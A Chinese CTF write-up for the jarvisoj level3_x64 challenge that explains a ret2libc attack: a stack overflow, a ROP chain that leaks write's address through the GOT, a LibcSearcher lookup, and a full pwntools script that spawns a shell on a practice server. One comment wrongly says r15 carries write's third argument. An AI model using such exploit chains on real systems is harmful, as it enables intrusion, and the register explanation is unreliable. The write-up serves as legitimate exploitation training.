## jarvisoj_level3_x64+write函数的原型

附件

步骤：

例行检查，64位程序，开启了nx保护

试运行一下程序，看看大概的情况

64位ida载入，习惯性的检索字符串，没有发现可以直接利用的system，估计使用ret2libc的方法
从main函数开始看程序

function（）函数

输入点buf明显的溢出漏洞，read之前已经调用过一个write函数了，可以利用它来泄露libc版本
利用过程
泄露libc版本
64位汇编传参，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。
当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。
我们这边要利用write函数去泄露libc版本

```
write函数的原型，它有三个参数，所以我们这边需要用到三个寄存器去传参
ssize_t write(int fd,const void*buf,size_t count);
参数说明：
  fd:是文件描述符（write所对应的是写，即就是1）
  buf:通常是一个字符串，需要写入的字符串
  count：是每次写入的字节数
```


利用ROPgadget找一下设置寄存器的指令

```
rdi=0x4006b3
rsi_r15=0x4006b1

rdi=0x4006b3
rsi_r15=0x4006b1
write_plt=elf.plt['write']
write_got=elf.got['write']
main=0x40061A

payload='a'*(0x80+8)+p64(rdi)+p64(1)           #rdi寄存器设置write函数的第一个参数为‘1’
payload+=p64(rsi_r15)+p64(write_got)+p64(4)   #rsi寄存器设置write函数的第二个参数为write_got表的地址，r15寄存器设置write函数的第三个参数为8
payload+=p64(write_plt)   #去调用write函数
payload+=p64(main)        #控制程序流，回到main函数，继续控制

r.sendlineafter('Input:',payload)

write_addr=u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
```



计算出程序里的system和bin/sh的真实地址

```
libc=LibcSearcher('write',write_addr)
libc_base=write_addr-libc.dump('write')
system_addr=libc_base+libc.dump('system')
binsh=libc_base+libc.dump('str_bin_sh')
```

构造payload，获取shell
payload='a'*(0x80+8)+p64(rdi)+p64(binsh)+p64(system_addr)

完整exp：

```
from pwn import *
from LibcSearcher import *

r=remote('node3.buuoj.cn',29886)
context(os = "linux", arch = "amd64", log_level= "debug")

elf=ELF('./level3_x64')

#libc=ELF('./libc-2.19.so')

write_plt=elf.plt['write']
write_got=elf.got['write']
main=0x40061A

rdi=0x4006b3
rsi_r15=0x4006b1

payload='a'*(0x80+8)+p64(rdi)+p64(1)
payload+=p64(rsi_r15)+p64(write_got)+p64(8)
payload+=p64(write_plt)
payload+=p64(main)

r.sendlineafter('Input:',payload)

write_addr=u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
#write_addr=u64(r.recvuntil('\n')[:-1].ljust(8,'\0'))


print hex(write_addr)

libc=LibcSearcher('write',write_addr)
libc_base=write_addr-libc.dump('write')
system_addr=libc_base+libc.dump('system')
binsh=libc_base+libc.dump('str_bin_sh')

payload='a'*(0x80+8)+p64(rdi)+p64(binsh)+p64(system_addr)

r.sendlineafter('Input:',payload)

r.interactive()
```



